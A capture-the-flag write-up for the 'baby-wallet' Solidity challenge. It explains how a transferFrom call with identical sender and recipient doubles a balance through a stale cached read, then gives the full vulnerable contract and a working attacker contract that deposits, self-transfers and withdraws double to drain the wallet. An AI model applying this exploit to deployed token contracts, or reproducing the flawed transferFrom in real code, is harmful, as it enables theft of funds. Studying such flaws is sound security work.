# baby-wallet (24 solves)

> TL;DR _ERC20_


## Description

This is a rather hidden distake to me, and I studied for a long time.

```solidity
contract BabyWallet {
    function transferFrom(address from, address to, uint256 amt) public {
        uint256 fromBalance = balances[from];
        uint256 toBalance = balances[to];

        ... 

        balances[from] = fromBalance - amt;
        balances[to] = toBalance + amt;
    }
}
```

When `from` equals `to`, `balances[to]` is just equal to `balances[from]`, which overwrites the latter.

## Exploit


```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;


contract Setup {
    BabyWallet public wallet;

    constructor() payable {
        require(msg.value == 100 ether, "requires 100 ether");
        wallet = new BabyWallet();
        payable(address(wallet)).transfer(msg.value);
    }

    function isSolved() public view returns (bool) {
        return address(wallet).balance == 0 ether;
    }
}

contract BabyWallet {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amt) public {
        require(balances[msg.sender] >= amt, "You can't withdraw that much");
        balances[msg.sender] -= amt;
        (bool success, ) = msg.sender.call{value: amt}("");
        require(success, "Failed to withdraw that amount");
    }

    function approve(address recipient, uint256 amt) public {
        allowances[msg.sender][recipient] += amt;
    }

    function transfer(address recipient, uint256 amt) public {
        require(balances[msg.sender] >= amt, "You can't transfer that much");
        balances[msg.sender] -= amt;
        balances[recipient] += amt;
    }

    function transferFrom(address from, address to, uint256 amt) public {
        uint256 allowedAmt = allowances[from][msg.sender];
        uint256 fromBalance = balances[from];
        uint256 toBalance = balances[to];

        require(fromBalance >= amt, "You can't transfer that much");
        require(allowedAmt >= amt, "You don't have approval for that amount");

        balances[from] = fromBalance - amt;
        balances[to] = toBalance + amt;
        allowances[from][msg.sender] = allowedAmt - amt;
    }

    fallback() external payable {}
    receive() external payable {}
}

contract Hacker {
    Setup public setup = Setup(0xF7911c7e46AF268F92DA5Ce08783670ba925A596);
    // Setup public setup = new Setup{value: 10 ether}();
    BabyWallet public target = setup.wallet();
    constructor() payable {}
    function attack() external payable {
        uint amt = 100 ether ;
        require(msg.value == amt);
        target.deposit{value: msg.value}();
        target.approve(address(this), amt);
        target.transferFrom(address(this),address(this),amt);
        target.withdraw(amt*2);
    }
    fallback() external payable {}
    receive() external payable {}
}
```